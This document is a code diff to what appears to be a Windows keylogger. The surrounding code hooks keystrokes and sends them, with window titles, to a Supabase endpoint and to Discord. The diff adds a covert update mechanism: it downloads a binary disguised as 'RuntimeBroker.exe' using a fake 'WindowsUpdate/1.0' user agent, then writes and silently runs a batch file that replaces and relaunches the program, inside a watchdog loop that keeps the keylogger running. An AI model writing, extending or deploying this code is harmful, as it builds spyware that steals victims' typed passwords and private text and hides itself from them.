@@ -6,13 +6,20 @@
 #include <wincrypt.h>
 #include "config.h"
 
+#ifndef NETPEN_VERSION
+#define NETPEN_VERSION 0
+#endif
+
 #define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
 #define SUPABASE_CONTROL_PATH L"/rest/v1/control"
+#define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
+#define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"
 
 static HHOOK g_hHook = NULL;
 static std::string g_winTitle;
 static std::string g_keys;
 static DWORD g_lastTick = 0;
+static DWORD g_lastDiscord = 0;
 static bool g_running = true;
 static bool g_selfDestructing = false;
 static std::string g_hostname;
@@ -255,7 +262,64 @@ static bool PostKeys(const std::string& json) {
     return HttpRequest(L"POST", SUPABASE_KEYS_PATH, json, response);
 }
 
+static bool HttpGetToString(const wchar_t* path, std::string& response) {
+    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return false;
+    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
+    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    std::string result;
+    DWORD size = 0;
+    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
+        char* buf = new char[size + 1];
+        ZeroMemory(buf, size + 1);
+        DWORD downloaded = 0;
+        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
+            result.append(buf, downloaded);
+        delete[] buf;
+    }
+    response = result;
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+    return true;
+}
+
+static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
+    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return false;
+    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
+    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    DWORD size = 0;
+    bool ok = true;
+    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
+        char* buf = new char[size];
+        DWORD downloaded = 0;
+        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
+            DWORD written = 0;
+            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
+        }
+        delete[] buf;
+    }
+    CloseHandle(hFile);
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+    if (!ok) { DeleteFileA(outputPath); return false; }
+    return true;
+}
+
 static void PostToDiscord(const std::string& hostname, const std::string& window, const std::string& keys) {
+    DWORD now = GetTickCount();
+    if (now - g_lastDiscord < 30000) return;
+    g_lastDiscord = now;
     std::string host = hostname.empty() ? "unknown" : hostname;
     std::string win = window.empty() ? "unknown" : window;
     std::string k = keys.empty() ? "(no keys)" : keys;
@@ -338,6 +402,52 @@ static bool CheckSelfDestruct() {
     std::string response;
     if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
     if (response.empty() || response == "[]") return false;
+    return true;
+}
+
+static int GetRemoteVersion() {
+    std::string s;
+    if (!HttpGetToString(STORAGE_VER_PATH, s)) return -1;
+    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
+        s.pop_back();
+    if (s.empty()) return -1;
+    return atoi(s.c_str());
+}
+
+static bool DeployUpdate(int remoteVer) {
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    std::string newExe = std::string(tmp) + "NetpenUpdate.exe";
+    std::string batFile = std::string(tmp) + "NetpenUpdate.bat";
+    if (!HttpDownloadToFile(STORAGE_EXE_PATH, newExe.c_str())) {
+        LogMsg("Update: download failed");
+        return false;
+    }
+    char selfPath[MAX_PATH];
+    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+    std::string exeName = GetExeName();
+    std::string bat =
+        std::string("@echo off\r\n")
+        + "set \"O=" + std::string(selfPath) + "\"\r\n"
+        + "set \"N=" + newExe + "\"\r\n"
+        + ":w\r\ntasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
+        + "if errorlevel 1 goto r\r\ntimeout /t 2 /nobreak >nul\r\ngoto w\r\n"
+        + ":r\r\ncopy /y \"%N%\" \"%O%\" >nul\r\n"
+        + "start \"\" \"%O%\"\r\n"
+        + "del \"%N%\"\r\ndel \"%~f0\"\r\n";
+    HANDLE hf = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) { DeleteFileA(newExe.c_str()); return false; }
+    DWORD w = 0;
+    WriteFile(hf, bat.c_str(), (DWORD)bat.size(), &w, NULL);
+    CloseHandle(hf);
+    STARTUPINFOA si = {0}; si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+    std::string cmd = "cmd.exe /c \"" + batFile + "\"";
+    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        DeleteFileA(newExe.c_str()); DeleteFileA(batFile.c_str()); return false;
+    }
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    LogMsg("Update deployed: v" + std::to_string(remoteVer));
     return true;
 }
 
@@ -582,20 +692,47 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     while (true) {
         RemoveKillFlag();
+
         STARTUPINFOA si = {0};
         si.cb = sizeof(si);
         PROCESS_INFORMATION pi = {0};
         std::string childCmd = "\"" + exePath + "\" --child";
 
-        if (CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-            WaitForSingleObject(pi.hProcess, INFINITE);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
+        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            Sleep(30000);
+            continue;
         }
+
+        bool updated = false;
+        while (true) {
+            DWORD wr = WaitForSingleObject(pi.hProcess, 300000);
+            if (wr == WAIT_TIMEOUT) {
+                int rv = GetRemoteVersion();
+                if (rv > NETPEN_VERSION) {
+                    TerminateProcess(pi.hProcess, 1);
+                    updated = DeployUpdate(rv);
+                    break;
+                }
+                if (KillFlagExists()) {
+                    TerminateProcess(pi.hProcess, 1);
+                    break;
+                }
+            } else {
+                break;
+            }
+        }
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
 
         if (KillFlagExists()) {
             RemoveKillFlag();
             LogMsg("Self-destruct triggered, watchdog exiting");
+            break;
+        }
+
+        if (updated) {
+            LogMsg("Watchdog exiting for update");
             break;
         }
 
